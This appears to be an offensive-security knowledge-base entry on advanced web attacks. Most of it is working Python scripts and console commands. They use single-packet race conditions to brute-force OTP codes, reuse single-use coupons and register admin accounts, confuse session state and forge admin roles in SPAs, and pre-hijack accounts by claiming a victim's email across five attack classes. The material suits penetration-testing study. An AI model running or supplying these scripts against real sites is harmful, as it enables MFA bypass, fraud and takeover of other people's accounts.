# KB-40: Race Conditions & Session Puzzling Advanced

## Overview

Advanced race condition exploitation using single-packet techniques and auth state confusion in SPAs.

---

## 1. Single-Packet Race Condition Technique

### 1.1 Theory

By sending multiple HTTP requests in a single TCP packet, all requests arrive at the server simultaneously, eliminating network jitter and creating reliable race conditions.

### 1.2 Exploitation

```python
import socket, ssl

class SinglePacketRace:
    def __init__(self, target_host, target_port=443):
        self.host = target_host
        self.port = target_port

    def build_request(self, method, path, headers, body=None):
        req = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        if body:
            req += f"Content-Length: {len(body)}\r\n\r\n{body}"
        else:
            req += "\r\n"
        return req.encode()

    def race_mfa_bypass(self, session_cookie, otp_codes):
        """Send multiple OTP attempts simultaneously."""
        ctx = ssl.create_default_context()
        sock = socket.create_connection((self.host, self.port))
        ssock = ctx.wrap_socket(sock, server_hostname=self.host)
        
        # Build all requests
        requests_data = b""
        for code in otp_codes:
            req = self.build_request('POST', '/api/verify-otp',
                {'Cookie': f'session={session_cookie}',
                 'Content-Type': 'application/x-www-form-urlencoded'},
                f'otp={code}')
            requests_data += req
        
        # Send all in single write (single TCP packet)
        ssock.sendall(requests_data)
        
        # Read responses
        response = b""
        while True:
            try:
                chunk = ssock.recv(4096)
                if not chunk: break
                response += chunk
            except: break
        
        ssock.close()
        return response

    def race_coupon_reuse(self, session_cookie, coupon_code, count=20):
        """Race condition to reuse single-use tokens/coupons."""
        ctx = ssl.create_default_context()
        sock = socket.create_connection((self.host, self.port))
        ssock = ctx.wrap_socket(sock, server_hostname=self.host)
        
        requests_data = b""
        for _ in range(count):
            req = self.build_request('POST', '/api/redeem',
                {'Cookie': f'session={session_cookie}',
                 'Content-Type': 'application/json'},
                f'{{"code":"{coupon_code}"}}')
            requests_data += req
        
        ssock.sendall(requests_data)
        response = ssock.recv(65536)
        ssock.close()
        
        success_count = response.count(b'"success":true') + response.count(b'200 OK')
        print(f"[*] Successful redemptions: {success_count}/{count}")
        if success_count > 1:
            print("[CRITICAL] Race condition — single-use token reused!")

    def race_registration(self, email, count=10):
        """Race to register same email with different roles."""
        ctx = ssl.create_default_context()
        sock = socket.create_connection((self.host, self.port))
        ssock = ctx.wrap_socket(sock, server_hostname=self.host)
        
        requests_data = b""
        for i in range(count):
            body = f'{{"email":"{email}","password":"test123","role":"admin"}}'
            req = self.build_request('POST', '/api/register',
                {'Content-Type': 'application/json'}, body)
            requests_data += req
        
        ssock.sendall(requests_data)
        print("[*] Race registration sent — check if admin role assigned")
```

---

## 2. Session Puzzling

```python
class SessionPuzzling:
    def __init__(self, target):
        self.target = target

    def test_auth_state_confusion(self):
        """
        Session puzzling: different auth flows write to the same session
        variable, allowing one flow to set state that another flow trusts.
        """
        s = requests.Session()
        
        # Step 1: Start password reset (sets session['user'] = target_email)
        s.post(f"{self.target}/forgot-password",
               data={'email': 'admin@target.com'})
        
        # Step 2: Access authenticated page (checks session['user'])
        resp = s.get(f"{self.target}/dashboard")
        if resp.status_code == 200:
            print("[CRITICAL] Session puzzling — reset flow grants dashboard access!")

    def test_spa_state_confusion(self):
        """
        SPA auth state confusion: client-side state (localStorage/Redux)
        can be manipulated to bypass auth checks.
        """
        print("""
        SPA Auth State Manipulation:
        
        1. Open browser DevTools Console
        2. localStorage.setItem('auth_token', 'fake-token')
        3. localStorage.setItem('user', JSON.stringify({role:'admin',authenticated:true}))
        4. Reload page — if API doesn't validate, SPA renders admin UI
        5. Even if API rejects, the SPA may expose admin routes/components
        
        React/Redux:
        store.dispatch({type:'SET_USER', payload:{role:'admin'}})
        
        Vue/Pinia:
        __vue_app__.$pinia._s.get('auth').$patch({isAdmin: true})
        """)

    def test_parallel_session_flows(self):
        """
        Start multiple auth flows simultaneously to confuse session state.
        """
        import concurrent.futures
        
        def login_flow(creds):
            s = requests.Session()
            return s.post(f"{self.target}/login", data=creds)
        
        # Race: login as user A and user B with same session
        creds_list = [
            {'username': 'user', 'password': 'pass'},
            {'username': 'admin', 'password': 'wrong'},
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(login_flow, c) for c in creds_list * 5]
```

---

## 3. Account Pre-Hijacking (All 5 Classes)

```python
class AccountPreHijacking:
    def __init__(self, target):
        self.target = target

    def classic_federated_merge(self, victim_email):
        """
        Class 1: Classic-Federated Merge Attack
        1. Attacker creates account with victim's email (classic signup)
        2. Victim later signs up via federated IdP (Google/GitHub)
        3. App merges accounts — attacker's session now has victim's data
        """
        # Step 1: Register with victim's email
        resp = requests.post(f"{self.target}/register",
            data={'email': victim_email, 'password': 'attacker-password'})
        print(f"[*] Pre-registration: {resp.status_code}")
        # Attacker now waits for victim to use SSO with same email

    def unexpired_session_attack(self, victim_email):
        """
        Class 2: Unexpired Session Attack
        1. Attacker creates account and keeps session alive
        2. Victim does password reset (takes over the account)
        3. Attacker's old session still works — accesses victim's data
        """
        s = requests.Session()
        s.post(f"{self.target}/register",
               data={'email': victim_email, 'password': 'attacker123'})
        # Keep session — if app doesn't invalidate on password reset,
        # attacker retains access after victim resets password

    def trojan_identifier_attack(self, victim_email):
        """
        Class 3: Trojan Identifier Attack
        1. Attacker adds victim's email as secondary email
        2. Victim creates account with their email
        3. Attacker uses "forgot password" with the shared email
        """
        s = requests.Session()
        s.post(f"{self.target}/register",
               data={'email': 'attacker@evil.com', 'password': 'pass123'})
        s.post(f"{self.target}/settings/add-email",
               data={'email': victim_email})
        print("[*] Victim email added as secondary — waiting for victim signup")

    def non_verifying_idp_attack(self):
        """
        Class 4: Non-Verifying IdP Attack
        1. Attacker creates IdP account with victim's email (IdP doesn't verify)
        2. Uses federated login to target app
        3. App trusts IdP's email claim — attacker gets victim's account
        """
        print("[*] Find IdPs that don't verify email ownership")
        print("    Common: self-hosted GitLab, custom OIDC providers")

    def email_change_attack(self, victim_email):
        """
        Class 5: Email Change Attack
        1. Attacker creates account with own email
        2. Initiates email change to victim's email (doesn't complete verification)
        3. Victim signs up — app may merge based on pending email change
        """
        s = requests.Session()
        s.post(f"{self.target}/register",
               data={'email': 'attacker@evil.com', 'password': 'pass123'})
        s.post(f"{self.target}/settings/change-email",
               data={'new_email': victim_email})
        print("[*] Email change initiated but not verified")
```

## References

- Single-Packet Attack technique (James Kettle, PortSwigger)
- Account Pre-Hijacking research (Microsoft Research, 2022)
- Session Puzzling (OWASP)
- SPA Security Best Practices
